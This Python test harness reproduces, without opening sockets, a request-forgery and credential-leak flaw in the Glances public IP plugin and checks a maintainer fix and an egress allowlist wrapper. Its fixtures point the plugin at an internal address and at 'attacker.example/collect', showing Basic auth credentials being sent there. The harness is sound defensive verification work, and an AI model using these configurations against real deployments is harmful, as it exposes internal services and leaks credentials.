#!/usr/bin/env python3
"""Exercise Glances' public IP fetch path without opening network sockets.

The harness compiles the production ``IpPlugin.__init__``,
``ThreadPublicIpAddress`` methods, and ``urlopen_auth`` from tagged source
archives. Framework initialization and the thread start are stubbed; urllib
and Safe Egress sends are intercepted with local fixtures.
"""

from __future__ import annotations

import argparse
import ast
import base64
from io import BytesIO
import json
import socket
import threading
from pathlib import Path
from typing import Any
from unittest.mock import patch
from urllib.request import Request

from safe_egress import FetchPolicy, FetchResponse
from safe_integration import SafePublicIpFetcher, make_safe_thread_class


DEFAULT_API = "https://ipv4.ipleak.net/json/"
HTTP_DEFAULT_API = "http://ipv4.ipleak.net/json/"
INTERNAL_URL = "http://127.0.0.1/internal-status"
PUBLIC_FIXTURE = b'{"ip":"203.0.113.7","source":"controlled fixture"}'
INTERNAL_FIXTURE = b'{"secret":"SIMULATED INTERNAL SERVICE"}'
DUMMY_USERNAME = "fixture-user"
DUMMY_PASSWORD = "fixture-password"
DUMMY_AUTHORIZATION = "Basic " + base64.b64encode(
    f"{DUMMY_USERNAME}:{DUMMY_PASSWORD}".encode()
).decode()


def _function(node: ast.ClassDef, name: str) -> ast.FunctionDef:
    return next(n for n in node.body if isinstance(n, ast.FunctionDef) and n.name == name)


def _load_plugin_source(repo: Path, fake_urlopen: Any):
    plugin_path = repo / "glances/plugins/ip/__init__.py"
    globals_path = repo / "glances/globals.py"
    plugin_tree = ast.parse(plugin_path.read_text(encoding="utf-8"), filename=str(plugin_path))
    globals_tree = ast.parse(globals_path.read_text(encoding="utf-8"), filename=str(globals_path))
    plugin_class = next(
        node for node in plugin_tree.body
        if isinstance(node, ast.ClassDef) and node.name == "IpPlugin"
    )
    thread_class = next(
        node for node in plugin_tree.body
        if isinstance(node, ast.ClassDef) and node.name == "ThreadPublicIpAddress"
    )
    urlopen_auth = next(
        node for node in globals_tree.body
        if isinstance(node, ast.FunctionDef) and node.name == "urlopen_auth"
    )

    class _FrameworkPlugin:
        def __init__(self, args=None, config=None, fields_description=None):
            self._config = config or {}

        def get_conf_value(self, key, default=None):
            return self._config.get(key, default)

    class _Logger:
        def debug(self, *args, **kwargs):
            pass

        def warning(self, *args, **kwargs):
            pass

    # Keep the production thread constructor and fetch method unchanged.
    actual_thread = ast.ClassDef(
        name="ThreadPublicIpAddress",
        bases=[ast.Attribute(value=ast.Name(id="threading", ctx=ast.Load()), attr="Thread", ctx=ast.Load())],
        keywords=[],
        body=[_function(thread_class, "__init__"), _function(thread_class, "_fetch_public_ip_info")],
        decorator_list=[],
    )
    namespace: dict[str, Any] = {
        "threading": threading,
        "Request": Request,
        "urlopen": fake_urlopen,
        "json_loads": json.loads,
        "base64": base64,
        "logger": _Logger(),
        "fields_description": {},
        "urlparse": __import__("urllib.parse", fromlist=["urlparse"]).urlparse,
        "_FrameworkPlugin": _FrameworkPlugin,
    }
    exec(
        compile(ast.fix_missing_locations(ast.Module(body=[urlopen_auth], type_ignores=[])), str(globals_path), "exec"),
        namespace,
    )
    exec(
        compile(
            ast.fix_missing_locations(ast.Module(body=[actual_thread], type_ignores=[])),
            str(plugin_path),
            "exec",
        ),
        namespace,
    )

    production_thread = namespace["ThreadPublicIpAddress"]

    class _SynchronousThread(production_thread):
        def start(self):
            self.fixture_result = self._fetch_public_ip_info()

    plugin_node = ast.ClassDef(
        name="IpPlugin",
        bases=[ast.Name(id="_FrameworkPlugin", ctx=ast.Load())],
        keywords=[],
        body=[
            next(
                node for node in plugin_class.body
                if isinstance(node, ast.Assign)
                and any(
                    isinstance(target, ast.Name)
                    and target.id == "_default_public_refresh_interval"
                    for target in node.targets
                )
            ),
            _function(plugin_class, "__init__"),
        ],
        decorator_list=[],
    )
    namespace["ThreadPublicIpAddress"] = _SynchronousThread
    exec(
        compile(ast.fix_missing_locations(ast.Module(body=[plugin_node], type_ignores=[])), str(plugin_path), "exec"),
        namespace,
    )
    return namespace["IpPlugin"], production_thread


def _config(url: str) -> dict[str, list[str]]:
    return {
        "public_api": [url],
        "public_username": [DUMMY_USERNAME],
        "public_password": [DUMMY_PASSWORD],
        "public_field": ["ip"],
        "public_template": ["{ip}"],
        "public_disabled": ["False"],
        "public_refresh_interval": [300],
    }


def _run_maintainer_source(repo: Path, url: str) -> dict[str, Any]:
    requests: list[dict[str, Any]] = []

    def fixture_urlopen(request: Request, timeout: float = 0):
        requests.append(
            {
                "url": request.full_url,
                "authorization": request.get_header("Authorization"),
                "timeout": timeout,
            }
        )
        body = INTERNAL_FIXTURE if request.full_url == INTERNAL_URL else PUBLIC_FIXTURE
        return BytesIO(body)

    plugin_class, _ = _load_plugin_source(repo, fixture_urlopen)
    plugin = plugin_class(config=_config(url))
    thread = plugin.public_ip_thread
    return {
        "repository": str(repo.resolve()),
        "configured_url": url,
        "plugin_disabled": plugin.public_disabled,
        "requests": requests,
        "fetch_result": getattr(thread, "fixture_result", None),
    }


def _run_hardened(url: str, redirect: bool = False) -> dict[str, Any]:
    fetcher = SafePublicIpFetcher(
        policy=FetchPolicy(
            allowed_hosts=frozenset({"ipv4.ipleak.net"}),
            allowed_ports=frozenset({443}),
        )
    )
    send_urls: list[str] = []

    def safe_send(target, address, headers, *, method="GET", body=None, timeout_seconds=None):
        del address, body, timeout_seconds
        send_urls.append(target.url)
        if redirect and target.url == DEFAULT_API:
            return FetchResponse(
                302,
                (("Location", INTERNAL_URL),),
                b"",
                target.url,
                (),
                method,
            )
        return FetchResponse(200, (), PUBLIC_FIXTURE, target.url, (), method)

    plugin_class, actual_thread = _load_plugin_source(
        Path(__file__).resolve().parents[3] / "glances-v4.5.3",
        lambda request, timeout=0: BytesIO(PUBLIC_FIXTURE),
    )

    hardened_thread = make_safe_thread_class(actual_thread, fetcher)

    # Inject the compatible safe thread into the real v4.5.3 plugin initializer.
    plugin_class.__init__.__globals__["ThreadPublicIpAddress"] = hardened_thread

    class _SynchronousStart(hardened_thread):
        def start(self):
            self.fixture_result = self._fetch_public_ip_info()

    plugin_class.__init__.__globals__["ThreadPublicIpAddress"] = _SynchronousStart
    with patch("safe_egress.client.socket.getaddrinfo", return_value=[
        (socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP, "", ("93.184.216.34", 443))
    ]), patch.object(fetcher.opener.fetcher, "_send", side_effect=safe_send):
        plugin = plugin_class(config=_config(url))
    thread = plugin.public_ip_thread
    return {
        "configured_url": url,
        "plugin_disabled": plugin.public_disabled,
        "safe_send_urls": send_urls,
        "fetch_result": getattr(thread, "fixture_result", None),
    }


def run(vulnerable_repo: Path, fixed_repo: Path) -> dict[str, Any]:
    rejected_policies = []
    for policy in (
        FetchPolicy(),
        FetchPolicy(
            allowed_hosts=frozenset({"ipv4.ipleak.net"}),
            allowed_ips=frozenset({"127.0.0.1"}),
            allowed_ports=frozenset({443}),
        ),
        FetchPolicy(
            allowed_hosts=frozenset({"ipv4.ipleak.net"}),
            allowed_ports=frozenset({80, 443}),
        ),
    ):
        try:
            SafePublicIpFetcher(policy=policy)
        except ValueError:
            rejected_policies.append(True)
        else:
            rejected_policies.append(False)
    default_policy_rejected, private_ip_exception_rejected, broad_port_policy_rejected = rejected_policies

    attacker = _run_maintainer_source(vulnerable_repo, INTERNAL_URL)
    public_exfil = _run_maintainer_source(vulnerable_repo, "https://attacker.example/collect")
    fixed_http = _run_maintainer_source(fixed_repo, INTERNAL_URL)
    fixed_file = _run_maintainer_source(fixed_repo, "file:///tmp/dummy-only")
    hardened_direct = _run_hardened(INTERNAL_URL)
    hardened_untrusted_public = _run_hardened("https://attacker.example/collect")
    hardened_http_downgrade = _run_hardened(HTTP_DEFAULT_API)
    hardened_redirect = _run_hardened(DEFAULT_API, redirect=True)
    hardened_public = _run_hardened(DEFAULT_API)

    assert default_policy_rejected and private_ip_exception_rejected and broad_port_policy_rejected
    assert attacker["requests"][0]["url"] == INTERNAL_URL
    assert attacker["requests"][0]["authorization"] == DUMMY_AUTHORIZATION
    assert public_exfil["requests"][0]["authorization"] == DUMMY_AUTHORIZATION
    assert fixed_http["requests"][0]["url"] == INTERNAL_URL
    assert fixed_http["requests"][0]["authorization"] == DUMMY_AUTHORIZATION
    assert fixed_file["plugin_disabled"] and fixed_file["requests"] == []
    assert hardened_direct["safe_send_urls"] == []
    assert hardened_untrusted_public["safe_send_urls"] == []
    assert hardened_http_downgrade["safe_send_urls"] == []
    assert hardened_redirect["safe_send_urls"] == [DEFAULT_API]
    assert hardened_public["safe_send_urls"] == [DEFAULT_API]
    assert hardened_public["fetch_result"] == json.loads(PUBLIC_FIXTURE)

    return {
        "vulnerable_4_5_3_direct_internal": attacker,
        "vulnerable_4_5_3_attacker_public_host": public_exfil,
        "maintainer_fixed_4_5_4_direct_http_internal": fixed_http,
        "maintainer_fixed_4_5_4_file_scheme": fixed_file,
        "safe_egress_direct_internal": hardened_direct,
        "safe_egress_untrusted_public_host": hardened_untrusted_public,
        "safe_egress_http_downgrade": hardened_http_downgrade,
        "safe_egress_public_to_internal_redirect": hardened_redirect,
        "safe_egress_public_utility": hardened_public,
        "empty_host_allowlist_rejected": default_policy_rejected,
        "private_ip_exception_rejected": private_ip_exception_rejected,
        "broad_port_policy_rejected": broad_port_policy_rejected,
        "network": "synthetic DNS and in-memory urllib/SafeFetcher responses; no sockets opened",
        "policy_assumption": "the allowed public API hostname is trusted separately from the configurable URL",
    }


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--vulnerable-repo", type=Path, required=True)
    parser.add_argument("--fixed-repo", type=Path, required=True)
    args = parser.parse_args()
    print(json.dumps(run(args.vulnerable_repo, args.fixed_repo), indent=2))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
